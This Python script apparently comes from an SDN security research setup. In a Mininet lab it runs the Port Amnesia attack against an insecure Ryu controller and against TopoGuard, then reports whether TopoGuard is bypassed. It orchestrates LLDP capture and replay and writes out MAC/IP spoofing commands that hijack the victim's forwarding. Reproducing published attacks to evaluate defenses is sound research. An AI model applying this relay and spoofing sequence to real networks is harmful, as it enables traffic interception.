#!/usr/bin/env python3
"""A/B comparison: Port Amnesia attack on insecure baseline vs TopoGuard.

Run with sudo:
    sudo python3 pa_auto.py

Scenario (per Skowyra et al., DSN 2018):
1. Two colluding attacker hosts: h1 (on s1 port 1) and h3 (on s2 port 1).
   They share the host filesystem so /tmp/pa_lldp.bin acts as the side channel.
2. h3 sniffs a controller-emitted LLDP arriving on h3-eth0. The frame carries
   a valid TopoGuard HMAC TLV for (dpid=2, port=1).
3. h1 brings h1-eth0 down then up (port amnesia step). TopoGuard observes
   Port-Down/Port-Up on s1:1 and clears the cached host shutdown state.
4. h1 replays the captured LLDP onto h1-eth0. The controller verifies the
   HMAC (it is genuine) and reclassifies s1:1 as a SWITCH port WITHOUT
   raising any falsified-LLDP or LLDP-from-HOST-port violation.
5. With s1:1 demoted to a transit port, h1 spoofs h2's MAC/IP. The first-hop
   host-move check is skipped on SWITCH ports, so L2 learning binds the
   victim MAC to the attacker port. h3 -> 10.0.0.2 traffic now reaches h1.

Reported checks:
- Baseline: forged link learned in INSECURE log; attacker takeover of victim
  MAC forwarding on s1.
- TopoGuard: NO falsified-LLDP / HOST-port-LLDP / Host-Move violations
  triggered, demonstrating the bypass; victim MAC forwarding on s1 also
  redirected to the attacker port.
"""

from __future__ import annotations

from dataclasses import dataclass, field
import os
from pathlib import Path
import re
import shutil
import socket
import subprocess
import time
from typing import Set

from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.net import Mininet
from mininet.node import OVSKernelSwitch, RemoteController

from topology import TopoGuardTopo


ROOT = Path(__file__).resolve().parent
TOPOGUARD_APP = ROOT / "topoguard_ryu.py"
BASELINE_APP = ROOT / "insecure_baseline_ryu.py"
ATTACK_SCRIPT = ROOT / "attacks" / "port_amnesia.py"
CAPTURE_PATH = "/tmp/pa_lldp.bin"

VICTIM_IP = "10.0.0.2"
VICTIM_MAC = "00:00:00:00:00:02"


@dataclass
class TrialResult:
    name: str
    pre_loss: int
    post_loss: int
    attacker_port: int
    victim_port: int
    pre_outputs: Set[int] = field(default_factory=set)
    post_outputs: Set[int] = field(default_factory=set)
    insecure_link_learned: bool = False
    falsified_lldp_violation: bool = False
    host_port_lldp_violation: bool = False
    host_move_violation: bool = False
    log_file: Path = field(default_factory=lambda: Path("/dev/null"))


def resolve_ryu_manager() -> str:
    candidates = [
        shutil.which("ryu-manager"),
        "/home/yuvraj/.local/bin/ryu-manager",
        "/usr/local/bin/ryu-manager",
        "/usr/bin/ryu-manager",
    ]
    for candidate in candidates:
        if candidate and Path(candidate).exists():
            return candidate
    raise FileNotFoundError("ryu-manager not found")


def start_controller(app_path: Path, log_path: Path) -> subprocess.Popen:
    ryu_manager = resolve_ryu_manager()
    run_cmd = [ryu_manager, str(app_path)]
    if os.geteuid() == 0:
        sudo_user = os.environ.get("SUDO_USER", "yuvraj")
        run_cmd = ["sudo", "-u", sudo_user, "-H"] + run_cmd

    logf = log_path.open("w", encoding="utf-8")
    proc = subprocess.Popen(run_cmd, cwd=str(ROOT), stdout=logf, stderr=subprocess.STDOUT)
    proc._log_file_handle = logf  # type: ignore[attr-defined]
    return proc


def stop_controller(proc: subprocess.Popen) -> None:
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
    logf = getattr(proc, "_log_file_handle", None)
    if logf is not None:
        logf.close()


def wait_for_tcp_listener(host: str, port: int, timeout_s: float = 12.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(0.5)
            if sock.connect_ex((host, port)) == 0:
                return True
        finally:
            sock.close()
        time.sleep(0.25)
    return False


def parse_packet_loss(ping_output: str) -> int:
    m = re.search(r"(\d+(?:\.\d+)?)%\s+packet loss", ping_output)
    if not m:
        m_tx_rx = re.search(
            r"(\d+)\s+packets transmitted,\s+(\d+)\s+(?:packets\s+)?received",
            ping_output,
        )
        if not m_tx_rx:
            return 100
        tx = int(m_tx_rx.group(1))
        rx = int(m_tx_rx.group(2))
        if tx <= 0:
            return 100
        loss = round(((tx - rx) * 100.0) / tx)
        return max(0, min(100, int(loss)))
    loss = round(float(m.group(1)))
    return max(0, min(100, int(loss)))


def ping_loss(host, ip: str, count: int = 3) -> int:
    out = host.cmd(f"ping -c {count} -W 1 {ip}")
    return parse_packet_loss(out)


def clear_switch_flows() -> None:
    for sw in ("s1", "s2"):
        subprocess.run(
            ["ovs-ofctl", "-O", "OpenFlow13", "del-flows", sw],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        subprocess.run(
            [
                "ovs-ofctl",
                "-O",
                "OpenFlow13",
                "add-flow",
                sw,
                "priority=0,actions=CONTROLLER:65535",
            ],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


def get_switch_port_for_host(sw, host) -> int:
    link = host.defaultIntf().link
    sw_intf = link.intf1 if link.intf1.node == sw else link.intf2
    return int(sw.ports[sw_intf])


def get_s1_outputs_for_victim_mac() -> Set[int]:
    proc = subprocess.run(
        ["ovs-ofctl", "-O", "OpenFlow13", "dump-flows", "s1"],
        check=False,
        capture_output=True,
        text=True,
    )
    outputs: Set[int] = set()
    dst_match = f"dl_dst={VICTIM_MAC}"
    for line in proc.stdout.splitlines():
        if dst_match not in line:
            continue
        for token in re.findall(r"output:(\d+)", line):
            outputs.add(int(token))
    return outputs


def run_trial(name: str, app_path: Path) -> TrialResult:
    setLogLevel("warning")
    subprocess.run(["mn", "-c"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    log_path = ROOT / f"pa_{name}.log"
    if os.path.exists(CAPTURE_PATH):
        os.remove(CAPTURE_PATH)

    controller = start_controller(app_path, log_path)

    if not wait_for_tcp_listener("127.0.0.1", 6653, timeout_s=12.0):
        stop_controller(controller)
        raise RuntimeError(f"{name}: controller not listening on 6653")

    net = Mininet(
        topo=TopoGuardTopo(),
        controller=None,
        switch=OVSKernelSwitch,
        link=TCLink,
        autoSetMacs=False,
        autoStaticArp=False,
        build=False,
    )
    net.addController(RemoteController("c0", ip="127.0.0.1", port=6653))

    try:
        net.build()
        net.start()
        # Allow controller to install table-miss + emit initial LLDP burst.
        time.sleep(3)

        h1 = net.get("h1")  # primary attacker (on s1)
        h2 = net.get("h2")  # victim
        h3 = net.get("h3")  # colluding attacker (on s2)
        s1 = net.get("s1")

        attacker_port = get_switch_port_for_host(s1, h1)
        victim_port = get_switch_port_for_host(s1, h2)

        # Warm-up host learning so port profiles converge to HOST.
        h2.cmd("ping -c 2 10.0.0.3 >/dev/null 2>&1")
        h3.cmd("ping -c 2 10.0.0.2 >/dev/null 2>&1")
        h3.cmd(f"arp -s {VICTIM_IP} {VICTIM_MAC}")

        clear_switch_flows()
        time.sleep(0.5)

        pre_loss = ping_loss(h3, VICTIM_IP, count=3)
        h3.cmd(f"ping -c 1 -W 1 {VICTIM_IP} >/dev/null 2>&1")
        time.sleep(0.5)
        pre_outputs = get_s1_outputs_for_victim_mac()

        # ----- Port Amnesia attack -----
        # 1) Colluding host h3 captures one controller-emitted LLDP.
        h3.cmd(
            f"python3 {ATTACK_SCRIPT} capture --iface h3-eth0 "
            f"--out {CAPTURE_PATH} --timeout 15 >/dev/null 2>&1 &"
        )
        time.sleep(0.5)
        # Bounce s2's controller connection so the controller re-emits its
        # initial LLDP burst after our capture is listening. TopoGuard also
        # has a 2 s heartbeat, but the insecure baseline emits LLDP only at
        # switch_features (every 600 s afterwards), so a reconnect is what
        # actually delivers a fresh LLDP frame to h3 in the baseline trial.
        subprocess.run(["ovs-vsctl", "del-controller", "s2"], check=False)
        time.sleep(0.4)
        subprocess.run(
            ["ovs-vsctl", "set-controller", "s2", "tcp:127.0.0.1:6653"],
            check=False,
        )
        time.sleep(8)

        if not (os.path.exists(CAPTURE_PATH) and os.path.getsize(CAPTURE_PATH) > 14):
            # Try one more reconnect bounce in case the first was missed.
            subprocess.run(["ovs-vsctl", "del-controller", "s2"], check=False)
            time.sleep(0.4)
            subprocess.run(
                ["ovs-vsctl", "set-controller", "s2", "tcp:127.0.0.1:6653"],
                check=False,
            )
            time.sleep(8)

        # 2) h1 performs port-down/up amnesia + replays captured LLDP.
        if os.path.exists(CAPTURE_PATH) and os.path.getsize(CAPTURE_PATH) > 14:
            h1.cmd(
                f"python3 {ATTACK_SCRIPT} inject --iface h1-eth0 "
                f"--in {CAPTURE_PATH} >/dev/null 2>&1"
            )
        time.sleep(1.0)

        # 3) Follow-on host-location hijack: spoof victim MAC/IP at h1.
        h1.cmd("ip link set dev h1-eth0 down")
        h1.cmd(f"ip link set dev h1-eth0 address {VICTIM_MAC}")
        h1.cmd("ip link set dev h1-eth0 up")
        h1.cmd(f"ip addr add {VICTIM_IP}/24 dev h1-eth0 >/dev/null 2>&1")

        clear_switch_flows()
        time.sleep(0.4)

        # Trigger relearn under spoofed identity.
        h1.cmd("ip neigh flush all >/dev/null 2>&1")
        h1.cmd("ping -c 5 -i 0.05 -W 1 10.0.0.254 >/dev/null 2>&1")
        h1.cmd("arp -s 10.0.0.3 00:00:00:00:00:03")
        h1.cmd("ping -c 8 -i 0.05 -W 1 10.0.0.3 >/dev/null 2>&1")
        time.sleep(0.7)

        clear_switch_flows()
        time.sleep(0.4)

        post_loss = ping_loss(h3, VICTIM_IP, count=3)
        h3.cmd(f"ping -c 1 -W 1 {VICTIM_IP} >/dev/null 2>&1")
        time.sleep(0.5)
        post_outputs = get_s1_outputs_for_victim_mac()

    finally:
        net.stop()
        stop_controller(controller)
        subprocess.run(["mn", "-c"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    logs = log_path.read_text(encoding="utf-8", errors="replace")
    insecure_link_learned = "[INSECURE] Learned link 2:1 -> 1:1" in logs
    falsified_lldp_violation = "Violation: receive falsified LLDP" in logs
    host_port_lldp_violation = "Violation: Receive LLDP packet from HOST port" in logs
    host_move_violation = "Violation: Host Move from switch" in logs

    return TrialResult(
        name=name,
        pre_loss=pre_loss,
        post_loss=post_loss,
        attacker_port=attacker_port,
        victim_port=victim_port,
        pre_outputs=pre_outputs,
        post_outputs=post_outputs,
        insecure_link_learned=insecure_link_learned,
        falsified_lldp_violation=falsified_lldp_violation,
        host_port_lldp_violation=host_port_lldp_violation,
        host_move_violation=host_move_violation,
        log_file=log_path,
    )


def main() -> int:
    if os.geteuid() != 0:
        print("Run with sudo: sudo python3 pa_auto.py")
        return 2

    baseline = run_trial("baseline", BASELINE_APP)
    topoguard = run_trial("topoguard", TOPOGUARD_APP)

    print("Port Amnesia A/B comparison (s1 forwarding for victim MAC):")
    for r in (baseline, topoguard):
        print(
            f"{r.name}: pre_loss={r.pre_loss} post_loss={r.post_loss} "
            f"pre_outputs={sorted(r.pre_outputs)} post_outputs={sorted(r.post_outputs)} "
            f"attacker_port={r.attacker_port} victim_port={r.victim_port} "
            f"insecure_link_learned={r.insecure_link_learned} "
            f"falsified_lldp_violation={r.falsified_lldp_violation} "
            f"host_port_lldp_violation={r.host_port_lldp_violation} "
            f"host_move_violation={r.host_move_violation} log={r.log_file}"
        )

    # Attack succeeds against TopoGuard iff:
    # - victim MAC forwarding on s1 was redirected to the attacker port, AND
    # - TopoGuard logged NO falsified-LLDP / HOST-port-LLDP / Host-Move
    #   violation (the controller never noticed the relay).
    tg_redirected = (
        topoguard.attacker_port in topoguard.post_outputs
        and topoguard.victim_port not in topoguard.post_outputs
    )
    tg_silent = not (
        topoguard.falsified_lldp_violation
        or topoguard.host_port_lldp_violation
        or topoguard.host_move_violation
    )
    tg_attack_success = tg_redirected and tg_silent

    bl_pre_ok = baseline.victim_port in baseline.pre_outputs
    bl_attack_success = baseline.insecure_link_learned

    if bl_attack_success and tg_attack_success:
        print("result=PASS")
        print(
            "observed=Port Amnesia bypasses TopoGuard: relayed LLDP verified, "
            "port silently reclassified as SWITCH, victim MAC forwarding on s1 "
            "redirected to attacker without any topology-violation alert"
        )
        return 0

    print("result=FAIL")
    print(
        f"baseline_pre_ok={bl_pre_ok} baseline_attack_success={bl_attack_success} "
        f"topoguard_redirected={tg_redirected} topoguard_silent={tg_silent}"
    )
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
